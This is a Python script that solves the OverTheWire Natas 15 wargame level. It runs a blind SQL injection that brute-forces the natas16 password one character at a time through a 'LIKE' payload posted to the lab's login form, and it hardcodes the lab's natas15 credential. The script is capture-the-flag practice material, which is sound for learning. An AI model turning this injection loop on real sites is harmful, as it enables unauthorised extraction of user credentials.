#Import Library
import requests
import re
from string import *

#Setting variables needed
username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

character = ascii_letters + digits
url = f'http://{username}.natas.labs.overthewire.org/'
pw = []

# Connect to natas
session = requests.Session()
flag = True
while flag:
    for c in character:
        #If c is not matched, loop will be finished
        flag = False
        #Set the payload up
        print("Password: " + ''.join(pw) + c)
        payloads={"username" : 'natas16" AND BINARY password LIKE "' + ''.join(pw) + c + '%"#'}
        response = session.request('POST', url, auth=(username,password), data=payloads)
        if "This user exists" in response.text:
            pw.append(c)
            flag = True
            break

#Print out the password
print(''.join(pw))
#Filtering to get a password
result = response.text
#result = re.findall('Successful login! The password for natas15 is (.*)<br>', response.text)[0]

#print(result)
